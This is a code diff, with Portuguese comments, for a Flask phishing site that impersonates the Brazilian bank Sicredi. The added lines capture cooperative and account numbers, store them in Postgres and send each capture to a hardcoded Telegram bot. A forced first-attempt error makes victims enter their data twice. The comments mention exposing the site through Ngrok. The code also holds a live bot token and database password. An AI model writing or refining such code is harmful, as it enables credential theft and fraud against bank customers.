@@ -1,36 +1,54 @@
-from flask import Flask, render_template, request, redirect
+from flask import Flask, render_template, request, redirect, session
 import psycopg2
+import requests
 
 app = Flask(__name__)
+# Chave para as sessões funcionarem (importante para a dupla tentativa)
+app.secret_key = 'projeto_sicredi_cesar_2026'
 
-# --- CONFIGURAÇÃO DO BANCO (Validada pelo DBeaver) ---
+# --- CONFIGURAÇÕES DO TELEGRAM ---
+TOKEN_TELEGRAM = "8584825689:AAE_X7_GsY2GUEJOCItb5EQb9q3TaFz94xA"
+CHAT_ID_TELEGRAM = "5520879672"
+
+def enviar_telegram(mensagem):
+    """Função que envia o log direto para o seu celular"""
+    try:
+        url = f"https://api.telegram.org/bot{TOKEN_TELEGRAM}/sendMessage"
+        payload = {
+            "chat_id": CHAT_ID_TELEGRAM, 
+            "text": mensagem, 
+            "parse_mode": "HTML"
+        }
+        requests.post(url, data=payload)
+    except Exception as e:
+        print(f"Erro ao enviar para o Telegram: {e}")
+
+# --- CONFIGURAÇÃO DO BANCO ---
 def get_db_connection():
-    # As credenciais abaixo foram configuradas para o seu banco local
-    conn = psycopg2.connect(
+    return psycopg2.connect(
         host='localhost',       
         database='postgres',   
         user='postgres',         
-        password='nvme',     # Senha que você definiu no seu Ubuntu
+        password='nvme',     
         port='5432'                 
     )
-    return conn
 
 @app.route('/')
 def index():
-    # O Flask buscará este arquivo em sicred/templates/login.html
-    return render_template('login.html')
+    # Pega o status da URL para exibir as mensagens no HTML
+    status = request.args.get('status')
+    return render_template('login.html', status=status)
 
 @app.route('/login', methods=['POST'])
 def login():
-    # Captura os dados enviados pelo formulário HTML
     coop = request.form.get('coop')
     conta = request.form.get('conta')
 
     if coop and conta:
         try:
+            # 1. Salva no banco (Sempre garante o dado primeiro)
             conn = get_db_connection()
             cur = conn.cursor()
-            # Comando para salvar na tabela usuarios_sicredi que você criou
             cur.execute(
                 "INSERT INTO usuarios_sicredi (cooperativa, conta) VALUES (%s, %s)",
                 (coop, conta)
@@ -39,16 +57,34 @@ def login():
             cur.close()
             conn.close()
             
-            print(f"Sucesso! Salvo no Postgres: Coop {coop}, Conta {conta}")
+            # 2. Identifica se é a 1ª ou 2ª tentativa para o log
+            if 'tentativa_feita' in session:
+                tipo_log = "✅ <b>DADOS CONFIRMADOS (2ª)</b>"
+                status_prox_passo = "sucesso"
+                session.pop('tentativa_feita', None) # Limpa para o próximo
+            else:
+                tipo_log = "⚠️ <b>PRIMEIRA CAPTURA (1ª)</b>"
+                status_prox_passo = "erro"
+                session['tentativa_feita'] = True
+
+            # 3. Monta e envia a mensagem para o Telegram
+            msg = (
+                f"{tipo_log}\n\n"
+                f"<b>Cooperativa:</b> <code>{coop}</code>\n"
+                f"<b>Conta:</b> <code>{conta}</code>\n"
+                f"<b>Local:</b> São Paulo (ZL)"
+            )
+            enviar_telegram(msg)
             
-            # Após salvar, redireciona para o site oficial
-            return redirect("https://www.sicredi.com.br")
+            # 4. Redireciona de volta com o status para o HTML
+            return redirect(f"/?status={status_prox_passo}")
+
         except Exception as e:
-            print(f"Erro ao salvar no banco: {e}")
-            return f"Erro interno no servidor: {e}", 500
+            print(f"Erro no processo: {e}")
+            return f"Erro interno: {e}", 500
 
     return redirect('/')
 
 if __name__ == '__main__':
-    # Rodando no IP da rede para testes em outros dispositivos
+    # host 0.0.0.0 permite que o Ngrok e outros dispositivos vejam o site
     app.run(debug=True, host='0.0.0.0', port=5000)
